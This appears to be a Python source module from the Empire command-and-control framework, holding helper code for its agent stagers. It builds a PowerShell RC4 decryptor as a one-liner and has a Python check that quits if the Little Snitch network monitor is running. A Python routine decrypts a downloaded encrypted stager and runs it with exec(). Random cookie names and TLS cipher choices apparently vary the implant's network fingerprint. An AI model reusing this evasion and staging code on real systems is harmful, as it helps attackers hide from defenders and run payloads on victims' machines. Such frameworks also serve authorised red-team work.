import random
import string
from textwrap import dedent

from empire.server.common import helpers
from empire.server.utils.data_util import ps_convert_to_oneliner


def remove_lines_comments(lines):
    """
    Remove lines comments.
    """
    code = ""
    for line in lines.split("\n"):
        _line = line.strip()
        # skip commented line
        if not _line.startswith("#"):
            code += _line
    return code


def powershell_rc4():
    """
    RC4 Stageer code for PowerShell agent
    """
    rc4 = dedent(
        """
    $R={$D,$K=$Args;
    $S=0..255;
    0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};
    $D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;
    $S[$I],$S[$H]=$S[$H],$S[$I];
    $_-bxor$S[($S[$I]+$S[$H])%256]}};
    """
    )
    return ps_convert_to_oneliner(rc4)


def python_safe_checks():
    """
    Check for Little Snitch and exits if found.
    """
    return dedent(
        r"""
    import re, subprocess;
    cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
    ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = ps.communicate();
    if re.search("Little Snitch", out.decode('UTF-8')):
       sys.exit();
    """
    )


def python_extract_stager(staging_key):
    """
    Download the stager and extract the IV for Python agent.
    """
    stager = dedent(
        f"""
    # ==== EXTRACT IV AND STAGER ====
    IV=a[0:4];
    data=a[4:];
    key=IV+'{staging_key}'.encode('UTF-8');
    # ==== DECRYPT STAGER (RC4) ====
    S,j,out=list(range(256)),0,[];
    for i in list(range(256)):
        j=(j+S[i]+key[i%len(key)])%256;
        S[i],S[j]=S[j],S[i];
    i=j=0;
    for char in data:
        i=(i+1)%256;
        j=(j+S[i])%256;
        S[i],S[j]=S[j],S[i];
        out.append(chr(char^S[(S[i]+S[j])%256]));
    # ==== EXECUTE STAGER ====
    exec(''.join(out));
    """
    )
    return helpers.strip_python_comments(stager)


def generate_cookie():
    """
    Generate Cookie
    """

    chars = string.ascii_letters
    return helpers.random_string(random.randint(6, 16), charset=chars)


def generate_random_cipher():
    """
    Generate random cipher
    """
    random_tls12 = [
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-SHA384",
        "ECDHE-RSA-AES256-SHA",
        "AES256-SHA256",
        "AES128-SHA256",
    ]
    tls12 = random.choice(random_tls12)

    tls10 = "ECDHE-RSA-AES256-SHA"
    return f"{tls12}:{tls10}"
